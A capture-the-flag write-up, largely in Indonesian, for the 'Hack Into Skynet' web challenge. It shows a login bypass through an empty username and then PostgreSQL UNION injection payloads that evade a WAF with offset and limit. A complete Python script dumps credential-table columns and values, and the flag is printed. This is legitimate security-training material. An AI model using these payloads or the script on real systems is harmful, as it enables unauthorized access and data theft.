# Hack Into Skynet

Hack into skynet to save the world, which way do you prefer?

Note: Skynet is a blackbox detection engine which is not provided. But you don't have to guess.

Note2: Scanner or sqlmap NOT REQUIRED to solve this challenge, please do not use scanners.

Target: [47.242.21.212:8081-8086](http://47.242.21.212:8081)

```txt
Category: Web
Difficulty: Schrodinger 
```

## Bypass the login
Diberikan sebuah tar file yang berisi script python dan terdapat sebuah vuln pada fungsi query_login_attempt() yang dimana me-return nilai bool true jika hanya menginputkan password tanpa menginputkan username 
```python
def query_login_attempt():
    username = flask.request.form.get('username', '')
    password = flask.request.form.get('password', '')
    if not username and not password:
        return False

    sql = ("SELECT id, account"
           "  FROM target_credentials"
           "  WHERE password = '{}'").format(hashlib.md5(password.encode()).hexdigest())
    user = sql_exec(sql)
    name = user[0][1] if user and user[0] and user[0][1] else ''
    return name == username
```
Asumsikan jika kita input password sembarang maka server akan mengembalikan empty string. Dengan itu, maka user akan menjadi empty string juga
```python
name = user[0][1] if user and user[0] and user[0][1] else ''
```
Fungsi tersebut akan me-return true karena name = '' dan username = ''
```python
return name == username
```

## Sqli Postgres and Preventing WAF 

Exececute query sql pada parameter name berdasarkan pada code, terdapat query yang mengambil input dari user dan return nilai output
```python
name = flask.request.form.get('name', '')
    if not name:
        return None

    sql = ("SELECT name, born"
           "  FROM target"
           "  WHERE age > 0"
           "    AND name = '{}'").format(name)
    nb = sql_exec(sql)
    if not nb:
        return None
    return '{}: {}'.format(*nb[0])
```
Untuk percobaan pertama menggunakan teknik union sql tetapi di block oleh WAF. Setelah mencari cara lain akhirnya percobaan berhasil dengan penambahan [offset, limit, dan ()]
```sql
' union SELECT '1',(SELECT '1') limit 1 offset 0 -- -
```
```html
<h1>Kill before</h1>
<h1>1: 1</h1>
```
Langsung saja kita buat payloadnya untuk melihat column dari table target_credentials dan didapat column 'id'
```sql
' union SELECT '1',(SELECT column_name FROM information_schema.columns WHERE table_name='target_credentials' offset 0 limit 1) offset 0 limit 1-- -
```
```html
<h1>Kill before</h1>
<h1>1: id</h1>
```
Karena kita dibatasi dengan limit, maka kita harus membrute-force pada offset satu persatu untuk me-leak semua column. Cukup dengan for loop untuk melakukan percobaan

Dayummmm we got that flag!
```txt
column -> secret_key, value -> [' rwctf{t0-h4ck-$kynet-0r-f1ask_that-Is-th3-questi0n}']
```
## Mnegkodingan
```python
import requests
import re

url = 'http://47.242.21.212:8081'

s = requests.Session()
data = {'username': '', 'password': 'admin'}
r = s.post(url + '/login', data=data)
for i in range(0, 25):
    a = list()
    data2 = {
        'name': """' union select '1', (SELECT column_name from information_schema.columns where table_name='target_credentials' offset {} limit 1) offset 0 limit 1 -- -""".format(i)}

    r = s.post(url, data=data2)
    filter = re.findall(r'<h1>1:(.*?)</h1>', r.text)
    if ' None' not in filter:
        a.append(filter[0].strip())
        for j in a:
            for i in range(0, 25):
                data2.update({'name': """' union select '1', (SELECT {} from target_credentials offset {} limit 1) offset 0 limit 1 -- -""".format(j, i)})
                r2 = s.post(url, data=data2)
                filter2 = re.findall(r'<h1>1:(.*?)</h1>', r2.text)
                if ' None' not in filter2:
                    print(f'column -> {j}, value -> {filter2}')
```
